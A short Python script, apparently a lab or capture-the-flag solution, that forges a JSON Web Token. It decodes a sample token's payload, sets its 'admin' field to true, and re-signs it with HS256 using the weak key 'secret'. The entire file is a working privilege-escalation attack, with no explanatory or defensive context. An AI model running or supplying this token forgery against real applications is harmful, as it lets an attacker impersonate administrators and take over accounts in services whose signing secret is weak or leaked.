import jwt
import base64
import json

key = "secret"
token1 = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOmZhbHNlfQ.-Rn2Yjl7gjPxDf2SIkyo_76iR_Yp-dA-E500-kS95NE"
jwtdata = token1.split(".")[1]
jwtdata = base64.b64decode(jwtdata+"==").decode('utf-8')
print(jwtdata)
jwtdata = json.loads(jwtdata)
jwtdata["admin"]=True


print(jwt.encode(jwtdata, key, algorithm="HS256"))
